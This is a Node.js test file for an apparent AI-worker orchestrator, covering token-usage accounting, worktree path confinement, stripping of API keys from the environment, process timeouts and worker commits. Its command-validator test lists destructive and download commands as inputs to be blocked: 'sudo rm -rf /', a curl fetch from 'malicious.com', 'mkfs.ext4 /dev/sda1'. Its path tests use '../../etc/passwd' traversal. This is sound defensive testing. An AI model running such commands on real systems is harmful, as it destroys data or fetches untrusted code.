import test from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import os from 'node:os'
import { execFileSync } from 'node:child_process'
import {
  assertPathWithinWorktree,
  sanitizeWorkerEnvironment,
  validateWorkerCommand,
  spawnControlledProcess,
  SecurityBoundaryError,
} from '../lib/orchestrator/security-boundary.mjs'
import {
  executeWorkerTask,
  buildWorkerPrompt,
  aggregateUsageFromEvents,
} from '../lib/orchestrator/worker-harness.mjs'
import {
  getOrchestratorDb,
  closeOrchestratorDb,
  createProject,
  createBaseline,
  approveBaseline,
  createMilestone,
  createTask,
  getTaskRun,
} from '../lib/orchestrator/db/index.mjs'
import {
  createFeatureBranch,
  provisionTaskWorktree,
  runGit,
} from '../lib/orchestrator/git-workspace.mjs'

function getTempDbPath() {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'zen-worker-test-'))
  return path.join(tmpDir, 'test-worker.sqlite')
}

function createTempGitRepo(prefix = 'zen-repo-worker-') {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), prefix))
  execFileSync('git', ['init', '-b', 'main', tmpDir])
  execFileSync('git', ['config', 'user.name', 'Worker Tester'], { cwd: tmpDir })
  execFileSync('git', ['config', 'user.email', 'worker@example.com'], { cwd: tmpDir })

  fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({
    name: 'worker-app',
    version: '1.0.0',
    scripts: { test: 'node --test' }
  }, null, 2))
  fs.writeFileSync(path.join(tmpDir, 'README.md'), '# Worker App\n')

  execFileSync('git', ['add', '.'], { cwd: tmpDir })
  execFileSync('git', ['commit', '-m', 'Initial commit'], { cwd: tmpDir })

  return tmpDir
}

/**
 * Token accounting regression tests.
 *
 * `executeWorkerTask` used to write literal `inputTokens: 100, outputTokens: 50` into every
 * task_run, sitting directly beside the event stream that carries the real numbers. Any cost
 * reporting built on that was fiction. These pin the aggregation to the CLI's actual
 * `--output-format stream-json` shapes.
 */

test('aggregateUsageFromEvents prefers the terminal result total', () => {
  const usage = aggregateUsageFromEvents([
    { type: 'assistant', message: { usage: { input_tokens: 10, output_tokens: 5 } } },
    { type: 'result', usage: { input_tokens: 1200, output_tokens: 340 } },
  ])

  assert.equal(usage.inputTokens, 1200)
  assert.equal(usage.outputTokens, 340)
  assert.equal(usage.isEstimated, false)
})

test('aggregateUsageFromEvents counts cache reads and writes as input', () => {
  const usage = aggregateUsageFromEvents([
    {
      type: 'result',
      usage: {
        input_tokens: 100,
        cache_creation_input_tokens: 2000,
        cache_read_input_tokens: 8000,
        output_tokens: 250,
      },
    },
  ])

  assert.equal(usage.inputTokens, 10100)
  assert.equal(usage.outputTokens, 250)
  assert.equal(usage.isEstimated, false)
})

test('aggregateUsageFromEvents accumulates per-turn usage when no result event exists', () => {
  const usage = aggregateUsageFromEvents([
    { type: 'assistant', message: { usage: { input_tokens: 500, output_tokens: 120 } } },
    { type: 'message_delta', usage: { output_tokens: 80 } },
    { type: 'assistant', message: { usage: { input_tokens: 640, output_tokens: 200 } } },
  ])

  assert.equal(usage.inputTokens, 1140)
  assert.equal(usage.outputTokens, 400)
  assert.equal(usage.isEstimated, false)
})

test('aggregateUsageFromEvents reports zero-and-estimated rather than inventing numbers', () => {
  for (const events of [[], [{ type: 'system', subtype: 'init' }], undefined]) {
    const usage = aggregateUsageFromEvents(events)
    assert.equal(usage.inputTokens, 0)
    assert.equal(usage.outputTokens, 0)
    assert.equal(usage.isEstimated, true, 'missing usage must be flagged, not guessed')
  }
})

test('assertPathWithinWorktree enforces strict path confinement', () => {
  const worktree = fs.mkdtempSync(path.join(os.tmpdir(), 'zen-worktree-conf-'))
  fs.mkdirSync(path.join(worktree, 'src'), { recursive: true })
  fs.writeFileSync(path.join(worktree, 'src', 'app.js'), 'code')

  // Valid path inside worktree
  const valid = assertPathWithinWorktree('src/app.js', worktree)
  assert.equal(fs.existsSync(valid), true)

  // Valid new file to be created inside worktree
  const newValid = assertPathWithinWorktree('src/new_module.js', worktree)
  assert.ok(newValid.startsWith(fs.realpathSync(worktree)))

  // Path traversal attempts must throw E_PATH_TRAVERSAL
  assert.throws(() => {
    assertPathWithinWorktree('../../etc/passwd', worktree)
  }, (err) => err instanceof SecurityBoundaryError && err.code === 'E_PATH_TRAVERSAL')

  assert.throws(() => {
    assertPathWithinWorktree('/etc/hosts', worktree)
  }, (err) => err instanceof SecurityBoundaryError && err.code === 'E_PATH_TRAVERSAL')

  // Direct access to .git must throw E_GIT_METADATA_PROTECTED
  assert.throws(() => {
    assertPathWithinWorktree('.git/config', worktree)
  }, (err) => err instanceof SecurityBoundaryError && err.code === 'E_GIT_METADATA_PROTECTED')

  fs.rmSync(worktree, { recursive: true, force: true })
})

test('sanitizeWorkerEnvironment strips sensitive API keys and tokens', () => {
  const dirtyEnv = {
    PATH: '/usr/bin:/bin',
    HOME: '/Users/test',
    USER: 'tester',
    ANTHROPIC_API_KEY: 'sk-ant-secret123',
    OPENAI_API_KEY: 'sk-proj-secret456',
    GOOGLE_APPLICATION_CREDENTIALS: '/path/to/creds.json',
    MY_SERVICE_TOKEN: 'token-abc',
    AWS_SECRET_ACCESS_KEY: 'aws-secret',
    CUSTOM_SAFE_VAR: 'safe-value',
  }

  const clean = sanitizeWorkerEnvironment(dirtyEnv)

  assert.equal(clean.PATH, '/usr/bin:/bin')
  assert.equal(clean.HOME, '/Users/test')
  assert.equal(clean.CUSTOM_SAFE_VAR, 'safe-value')
  assert.equal(clean.CI, 'true')

  // All sensitive tokens must be completely absent
  assert.equal(clean.ANTHROPIC_API_KEY, undefined)
  assert.equal(clean.OPENAI_API_KEY, undefined)
  assert.equal(clean.GOOGLE_APPLICATION_CREDENTIALS, undefined)
  assert.equal(clean.MY_SERVICE_TOKEN, undefined)
  assert.equal(clean.AWS_SECRET_ACCESS_KEY, undefined)
})

test('validateWorkerCommand enforces execution allowlist and blocks banned patterns', () => {
  // Allowed commands
  assert.equal(validateWorkerCommand('npm test'), true)
  assert.equal(validateWorkerCommand('pytest tests/'), true)
  assert.equal(validateWorkerCommand('cargo test'), true)
  assert.equal(validateWorkerCommand('git status'), true)

  // Banned administrative and destructive commands
  assert.throws(() => {
    validateWorkerCommand('sudo rm -rf /')
  }, (err) => err.code === 'E_BANNED_COMMAND')

  assert.throws(() => {
    validateWorkerCommand('curl http://malicious.com/script.sh')
  }, (err) => err.code === 'E_BANNED_COMMAND')

  assert.throws(() => {
    validateWorkerCommand('mkfs.ext4 /dev/sda1')
  }, (err) => err.code === 'E_BANNED_COMMAND')

  // Non-allowlisted commands
  assert.throws(() => {
    validateWorkerCommand('ruby exploit.rb')
  }, (err) => err.code === 'E_COMMAND_NOT_ALLOWLISTED')
})

test('spawnControlledProcess executes commands with timeout protection', async () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'zen-proc-test-'))

  // Quick command
  const res = await spawnControlledProcess('node', ['-e', 'console.log("process success")'], {
    cwd: tmpDir,
    timeoutMs: 5000,
  })

  assert.equal(res.exitCode, 0)
  assert.equal(res.timedOut, false)
  assert.match(res.stdout, /process success/)

  // Long-running command exceeding timeout (should be terminated with exitCode 124)
  const timeoutRes = await spawnControlledProcess('node', ['-e', 'setTimeout(() => {}, 10000)'], {
    cwd: tmpDir,
    timeoutMs: 300, // 300ms timeout
  })

  assert.equal(timeoutRes.timedOut, true)
  assert.equal(timeoutRes.exitCode, 124)

  fs.rmSync(tmpDir, { recursive: true, force: true })
})

test('executeWorkerTask creates candidate commit and diff digest', async () => {
  const dbPath = getTempDbPath()
  const db = getOrchestratorDb(dbPath)
  const repo = createTempGitRepo()

  const project = createProject({ name: 'Worker App', repoPath: repo }, db)
  const baseline = createBaseline({ projectId: project.id, specMarkdown: 'spec', contentDigest: 'd', status: 'APPROVED' }, db)
  const milestone = createMilestone({ baselineId: baseline.id, title: 'M1' }, db)

  const task = createTask({
    milestoneId: milestone.id,
    title: 'Implement Calculator Add',
    description: 'Add add() function in src/calc.js',
    scopePaths: ['src/calc.js'],
    status: 'In Progress',
  }, db)

  createFeatureBranch(repo, 'feature-calc')
  const { worktreePath } = provisionTaskWorktree(repo, 'zen/feature-calc', task.id)

  // Execute worker task using mockAction
  const result = await executeWorkerTask({
    taskId: task.id,
    projectId: project.id,
    worktreePath,
    scopePaths: ['src/calc.js'],
    mockAction: async ({ worktreePath }) => {
      fs.mkdirSync(path.join(worktreePath, 'src'), { recursive: true })
      fs.writeFileSync(path.join(worktreePath, 'src', 'calc.js'), 'export function add(a, b) { return a + b; }\n')
    },
  }, db)

  assert.ok(result.taskRunId.startsWith('run_'))
  assert.ok(result.candidateCommitSha.length >= 40)
  assert.ok(result.diffDigest.startsWith('sha256:'))
  assert.ok(result.baseCommitSha.length >= 40)

  // Verify candidate commit exists on task branch
  const branchHead = runGit(worktreePath, ['rev-parse', 'HEAD'])
  assert.equal(branchHead, result.candidateCommitSha)

  // Verify task_run record in database
  const run = getTaskRun(result.taskRunId, db)
  assert.equal(run.status, 'SUCCEEDED')
  assert.equal(run.candidate_commit_sha, result.candidateCommitSha)
  assert.equal(run.diff_digest, result.diffDigest)

  closeOrchestratorDb()
  fs.rmSync(repo, { recursive: true, force: true })
})
